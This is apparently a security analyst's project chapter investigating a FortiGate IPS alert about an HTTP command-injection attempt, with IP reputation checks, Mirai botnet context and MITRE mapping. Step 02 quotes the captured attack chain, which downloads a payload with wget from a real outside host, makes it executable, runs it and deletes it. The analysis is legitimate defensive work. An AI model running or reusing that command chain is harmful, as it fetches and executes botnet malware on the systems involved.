# FortiGate Command Injection

This chapter investigates a FortiGate IPS event where an external source sent an HTTP request containing shell commands to `web.seesec.co.il`. The analysis separates the source, destination, payload host, FortiGate action, reputation context, and evidence limits so the case is treated as a confirmed exploitation attempt without overstating successful compromise.

## Technical Context

Command injection occurs when attacker-controlled input reaches an operating-system shell. In this case, the request URL contains Unix-style commands that attempt to change directories, remove a file, download a payload, make it executable, run it with a `tplink` argument, and remove it afterward.

> A network security log can prove that the malicious request reached the monitored traffic path. It does not prove that the destination web server executed the command unless server-side logs, endpoint telemetry, file artifacts, or outbound connections confirm execution.

**Implemented controls and analysis actions:**

- Reviewed FortiGate IPS source, destination, URL, service, action, and user-agent fields.
- Broke the injected command chain into analyst-readable actions.
- Enriched the source IP and payload host with public reputation context.
- Connected the payload host and command pattern to Mirai-style router/IoT exploitation context.
- Mapped the behavior to Cyber Kill Chain and MITRE ATT&CK.
- Documented the server-side evidence still required before claiming compromise.

## Key Technical Terms

| Term | Meaning in this chapter |
|------|-------------------------|
| FortiGate IPS | The network security device that recorded the suspicious inbound HTTP request. |
| Command injection | An attack pattern where input is crafted so a target system interprets it as shell commands. |
| LuCI | A web interface commonly associated with OpenWrt router administration; its appearance helps explain the router-style targeting pattern. |
| Payload host | The external IP embedded in the injected `wget` command, used as the attempted download source. |
| `deviceAction=Accept` | The FortiGate action shown in the event; it confirms the event was accepted/logged, not blocked. |

---

## Detailed Walkthrough

### Step 01 - Identify the source, destination, and traffic direction

The first step is to establish traffic direction. The log identifies `195.1.144.109` / `no4.nordicvm.no` as the external source and `web.seesec.co.il` as the protected destination. This is inbound web traffic against a public-facing service, not normal user browsing.

> Direction matters because the source, destination, and payload host have different meanings. The source sent the request, the destination received the request, and the payload host appears inside the injected command.

![FortiGate source and destination fields](../../images/01-command-injection/fortigate-source-destination-summary.png)

<p><sub><strong>Screenshot 001 - FortiGate source and destination fields:</strong> The log row identifies `195.1.144.109` / `no4.nordicvm.no` as the source and `web.seesec.co.il` as the destination service.</sub></p>

This screenshot defines the investigation boundary: an outside host contacted a specific web service. Exploit success still requires server-side evidence.

---

### Step 02 - Break down the injected command chain

The strongest evidence is the request URL because it contains a shell-style command sequence. The sequence attempts to remove an old payload, download a new payload from `103.14.226.142`, make it executable, run it, and delete the local file afterward.

> The `tplink` argument is important because it suggests the payload may be designed for router or IoT-style targets rather than a normal web application workflow.

```text
cd /tmp
rm -rf shk
wget http://103.14.226.142/shk
chmod 777 shk
./shk tplink
rm -rf shk
```

| Command part | Analyst meaning |
|--------------|-----------------|
| `cd /tmp` | Uses a writable temporary directory commonly abused during exploitation. |
| `rm -rf shk` | Removes any previous copy of the payload name before downloading a fresh one. |
| `wget http://103.14.226.142/shk` | Pulls an external payload from attacker-controlled or compromised infrastructure. |
| `chmod 777 shk` | Makes the downloaded file executable by any user, which is unnecessary for a normal web request. |
| `./shk tplink` | Attempts to execute the downloaded file with a TP-Link/router-related argument. |
| `rm -rf shk` | Deletes the local payload afterward, reducing simple file-system evidence. |

![Injected LuCI request and payload command](../../images/01-command-injection/injected-luci-request-url.png)

<p><sub><strong>Screenshot 002 - Injected LuCI request and payload command:</strong> The request URL contains shell metacharacters, a `wget` payload download, executable permission changes, execution, and cleanup.</sub></p>

The command sequence is consistent with an automated exploitation attempt because each command has a clear attacker purpose: staging, download, permission change, execution, and cleanup.

---

### Step 03 - Interpret the FortiGate action and HTTP service fields

The FortiGate event shows `deviceAction=Accept`. The log confirms detection and logging of the malicious request, but it does not prove firewall prevention or successful server-side execution.

> Detection and prevention are different outcomes. A log entry with `Accept` should be followed by web server logs, endpoint telemetry, and outbound network checks before declaring compromise.

![FortiGate IPS action and HTTP service fields](../../images/01-command-injection/fortigate-ips-action-and-service.png)

<p><sub><strong>Screenshot 003 - FortiGate IPS action and HTTP service fields:</strong> The screenshot shows `Accept`, FortiGate IPS, destination port 80/HTTP, transfer size, and `Go-http-client/1.1`.</sub></p>

`Go-http-client/1.1` often appears in automated tooling written in Go. Combined with the injected command chain, it supports scripted exploitation.

---

### Step 04 - Enrich the source IP

The source IP `195.1.144.109` initiated the HTTP request. The VirusTotal context shows low vendor detection, while AbuseIPDB and community reports connect the IP to web exploit activity. The local behavior is stronger than the reputation score because this source sent the command-injection request observed in the FortiGate log.

> Reputation evidence supports context, but the local log is the primary evidence. A low detection count does not override a clearly malicious request URL.

![AbuseIPDB profile for source IP](../../images/01-command-injection/abuseipdb-source-ip-profile.png)

<p><sub><strong>Screenshot 004 - AbuseIPDB source IP profile:</strong> AbuseIPDB context supports the source IP `195.1.144.109` being suspicious.</sub></p>

![Community reports for source IP](../../images/01-command-injection/source-ip-community-reports.png)

<p><sub><strong>Screenshot 005 - Community reports for source IP:</strong> Public reports show previous malicious activity associated with `195.1.144.109`, including web exploit activity and TP-Link-focused probing.</sub></p>

The source reputation aligns with the FortiGate evidence, but it still does not prove that `web.seesec.co.il` was compromised.

---

### Step 05 - Enrich the payload host and Mirai context

The payload host `103.14.226.142` appears directly inside the injected `wget` command. Because it is embedded in the exploit chain, it is treated as a payload-delivery indicator, not background noise.

> The payload host is more important than a random related IP because the attacker attempted to make the destination server retrieve content from it.

![VirusTotal result for payload host](../../images/01-command-injection/virustotal-payload-ip-detection.png)

<p><sub><strong>Screenshot 006 - VirusTotal result for payload host:</strong> VirusTotal flags `103.14.226.142`, the host used by the injected `wget` command.</sub></p>

The same address appears in Mirai Botnet IOC context. That matches the LuCI-style path and `tplink` argument, which point toward automated botnet-style exploitation against routers or exposed management interfaces.

![Mirai botnet IOC context](../../images/01-command-injection/mirai-botnet-ioc-context.png)

<p><sub><strong>Screenshot 007 - Mirai Botnet IOC context:</strong> The IOC report lists `103.14.226.142`, the same IP used in the injected `wget` command, under a Mirai Botnet indicator set.</sub></p>

![Mirai threat description](../../images/01-command-injection/mirai-threat-description.png)

<p><sub><strong>Screenshot 008 - Mirai threat description:</strong> The report describes Mirai as a botnet family targeting IoT devices and routers using multiple indicators of compromise.</sub></p>

The likely scenario is an automated Mirai-style exploitation attempt. The evidence supports attempted exploitation, not confirmed successful execution.

---

### Step 06 - Map the behavior and define server-side validation

The visible behavior maps to public-facing exploitation, shell command execution, and tool transfer. The request contains Unix-style shell commands and attempts to retrieve a payload with `wget`.

> MITRE mapping describes observed behavior. It should not be used to imply attacker success beyond what the evidence proves.

![MITRE command interpreter reference](../../images/01-command-injection/mitre-t1059-command-interpreter.png)

<p><sub><strong>Screenshot 009 - MITRE command interpreter reference:</strong> The MITRE reference supports mapping the command-execution behavior to Command and Scripting Interpreter techniques.</sub></p>

| Field | Assessment |
|-------|------------|
| Verdict | True positive malicious exploitation attempt. |
| Attack status | Confirmed attempt against `web.seesec.co.il`; successful compromise is not proven without server-side evidence. |
| Key evidence | LuCI-style request, shell command chain, `wget` payload download, `chmod`, execution syntax, cleanup command, suspicious source reputation, payload-host reputation, and Mirai-related IOC context. |
| Kill Chain and MITRE | Exploitation and payload transfer. Main mappings: [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/), [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/), [T1059.004 - Unix Shell](https://attack.mitre.org/techniques/T1059/004/), and [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/). |
| Evidence limits | FortiGate records `Accept`; no server-side execution log, outbound connection log, or downloaded `shk` artifact is available. |
| Next checks | Review web access/error/application logs, search for `shk`, `/tmp`, `wget`, `chmod`, outbound traffic to `103.14.226.142`, and similar LuCI/Mirai requests. |
| Recommendation | Validate the server, tune IPS prevention if required, block confirmed malicious indicators, and patch or restrict exposed management/application paths. |

The network alert is enough to classify the request as malicious, but server compromise requires server-side proof.

---

## Validation and Summary

FortiGate evidence confirms a malicious command-injection request and identifies the source, destination, payload host, and IPS action. Reputation checks and Mirai context strengthen the malicious classification, while the lack of server-side execution evidence prevents a confirmed-compromise verdict.

---

## Project Chapters

| # | Chapter | Description |
|---|---------|-------------|
| 0 | [Project Overview](../../README.md) | Main project overview, objectives, tools, and skills. |
| 1 | [FortiGate Command Injection](README.md) | Inbound HTTP command-injection attempt, payload host enrichment, Mirai context, and server-side validation limits. |
| 2 | [Quishing Email Analysis](../02-quishing-email-analysis/README.md) | QR email triage, sender review, decoded destination, VirtualBox sandbox validation, and PCAP evidence. |
| 3 | [Sentinel Sysmon Discovery](../03-sentinel-sysmon-discovery/README.md) | Sentinel/Sysmon discovery activity, process timelines, downloads, and response guidance. |
| 4 | [Final Summary](../04-final-summary/README.md) | Final verdicts, validation summary, recommendations, skills, and remaining evidence limits. |
